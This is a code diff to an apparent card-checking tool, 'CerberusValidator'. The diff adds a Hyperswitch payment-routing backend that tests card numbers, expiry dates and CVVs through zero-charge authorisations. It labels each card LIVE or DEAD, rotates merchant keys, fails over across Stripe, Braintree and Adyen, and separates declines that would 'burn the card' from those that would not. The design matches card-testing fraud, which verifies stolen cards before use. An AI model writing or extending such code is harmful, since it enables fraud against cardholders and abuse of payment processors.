@@ -35,6 +35,18 @@ try:
 except ImportError:
     _3DS_ENGINE = False
 
+# ── Hyperswitch Payment Orchestrator (V2.0) ──
+try:
+    from cerberus_hyperswitch import (
+        HyperswitchClient, HyperswitchRouter, HyperswitchVault,
+        HyperswitchRetry, HyperswitchAnalytics,
+        get_hyperswitch_client, get_hyperswitch_router,
+        is_hyperswitch_available, PaymentStatus,
+    )
+    _HYPERSWITCH = True
+except ImportError:
+    _HYPERSWITCH = False
+
 # Decline categories that are RECOVERABLE (don't burn the card)
 RECOVERABLE_CATEGORIES = {
     "processor_error", "issuer_unavailable",
@@ -323,10 +335,21 @@ class CerberusValidator:
         'default': 1.0,
     }
     
-    def __init__(self, keys: Optional[List[MerchantKey]] = None):
+    def __init__(self, keys: Optional[List[MerchantKey]] = None, use_hyperswitch: bool = True):
         self.keys = keys or []
         self.session: Optional[aiohttp.ClientSession] = None
         self._key_index = 0
+        self.use_hyperswitch = use_hyperswitch and _HYPERSWITCH and is_hyperswitch_available()
+        self._hs_client: Optional[object] = None
+        self._hs_router: Optional[object] = None
+        if self.use_hyperswitch:
+            try:
+                self._hs_client = get_hyperswitch_client()
+                self._hs_router = get_hyperswitch_router()
+                logger.info("Hyperswitch enabled — primary validation backend")
+            except Exception as e:
+                logger.warning(f"Hyperswitch init failed, falling back to direct PSP: {e}")
+                self.use_hyperswitch = False
     
     async def __aenter__(self):
         self.session = aiohttp.ClientSession()
@@ -394,7 +417,26 @@ class CerberusValidator:
         gateways_tried = []
         last_result = None
         
-        # Multi-gateway failover: try each provider in order
+        # V2.0: Try Hyperswitch first (50+ connectors with intelligent routing)
+        if self.use_hyperswitch and self._hs_client:
+            try:
+                hs_result = await self._validate_hyperswitch(card)
+                hs_result.gateways_tried = ["hyperswitch"]
+                gateways_tried.append("hyperswitch")
+                hs_result = self._enrich_decline_intelligence(hs_result)
+                
+                if hs_result.status == CardStatus.LIVE:
+                    return hs_result
+                if hs_result.status == CardStatus.DEAD and not hs_result.is_recoverable:
+                    return hs_result
+                
+                last_result = hs_result
+                logger.info(f"Hyperswitch returned {hs_result.status.value} — falling back to direct PSP")
+            except Exception as e:
+                logger.warning(f"Hyperswitch validation error: {e} — falling back to direct PSP")
+                gateways_tried.append("hyperswitch(error)")
+        
+        # Direct PSP failover: try each provider in order
         for provider in ("stripe", "braintree", "adyen"):
             key = self._get_next_key(provider)
             if not key:
@@ -493,6 +535,78 @@ class CerberusValidator:
                 pass
         
         return result
+    
+    async def _validate_hyperswitch(self, card: CardAsset) -> ValidationResult:
+        """
+        Validate via Hyperswitch unified API (routes to optimal connector).
+        
+        V2.0: Uses Hyperswitch's intelligent routing to select the best
+        connector from 50+ options. Zero-charge validation via manual
+        capture + immediate cancel.
+        """
+        try:
+            bin_info = self.BIN_DATABASE.get(card.bin, {})
+            card_country = bin_info.get("country", "US")
+            
+            payment = await self._hs_client.validate_card(
+                card_number=card.number,
+                card_exp_month=str(card.exp_month).zfill(2),
+                card_exp_year=str(card.exp_year),
+                card_cvc=card.cvv,
+            )
+            
+            connector_used = payment.connector or "hyperswitch"
+            
+            if payment.status == PaymentStatus.SUCCEEDED:
+                return ValidationResult(
+                    card=card,
+                    status=CardStatus.LIVE,
+                    message=f"Card validated via Hyperswitch ({connector_used})",
+                    bank_name=bin_info.get("bank"),
+                    country=card_country,
+                    risk_score=20,
+                    validation_method=f"hyperswitch_{connector_used}",
+                )
+            
+            elif payment.status == PaymentStatus.REQUIRES_CUSTOMER_ACTION:
+                return ValidationResult(
+                    card=card,
+                    status=CardStatus.LIVE,
+                    message=f"Card valid via Hyperswitch (3DS required) [{connector_used}]",
+                    bank_name=bin_info.get("bank"),
+                    country=card_country,
+                    risk_score=40,
+                    validation_method=f"hyperswitch_{connector_used}",
+                )
+            
+            elif payment.status == PaymentStatus.FAILED:
+                error_code = payment.error_code or "unknown"
+                error_msg = payment.error_message or "Validation failed"
+                return ValidationResult(
+                    card=card,
+                    status=CardStatus.DEAD,
+                    message=f"Hyperswitch declined ({connector_used}): {error_msg}",
+                    response_code=f"hyperswitch:{error_code}",
+                    bank_name=bin_info.get("bank"),
+                    country=card_country,
+                    validation_method=f"hyperswitch_{connector_used}",
+                )
+            
+            else:
+                return ValidationResult(
+                    card=card,
+                    status=CardStatus.UNKNOWN,
+                    message=f"Hyperswitch status: {payment.status.value}",
+                    validation_method=f"hyperswitch_{connector_used}",
+                )
+        
+        except Exception as e:
+            return ValidationResult(
+                card=card,
+                status=CardStatus.UNKNOWN,
+                message=f"Hyperswitch error: {str(e)}",
+                validation_method="hyperswitch_error",
+            )
     
     async def _validate_stripe(self, card: CardAsset, key: MerchantKey) -> ValidationResult:
         """
